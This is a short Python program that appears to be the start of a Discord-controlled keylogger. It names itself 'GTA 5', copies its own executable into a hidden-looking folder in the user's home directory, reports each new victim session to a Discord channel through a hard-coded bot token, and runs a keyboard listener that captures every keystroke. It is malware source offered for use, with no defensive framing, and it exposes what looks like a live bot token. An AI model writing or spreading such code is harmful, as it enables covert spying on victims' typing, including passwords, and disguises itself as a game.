import discord
from pynput.keyboard import Key, Listener
from shutil import copy2
import os
import sys
from getpass import getuser

client = discord.Client(intents=discord.Intents.all())

bot_token = 'NzQ2ODMyMjU1OTE3NDkwMTg2.X0GDvQ.6NO59zJzo9w37fKC3z8CxboE9Sk'   # Paste here BOT-token
software_registry_name = 'GTA 5'   # ---------------------------------------------- Software name shown in registry
software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name

channel_ids = {
    'main': 831567586344697868   # Paste here main channel ID
}

if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
    try:
        os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
    except:
        pass
    copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)

@client.event
async def on_ready():  
    await client.get_channel(channel_ids['main']).send('New PC session')

@client.event
async def on_message(message):
    print(message.content)

def on_press(key):
    print(key)

with Listener(on_press=on_press) as listener:
    client.run(bot_token)
    listener.join()
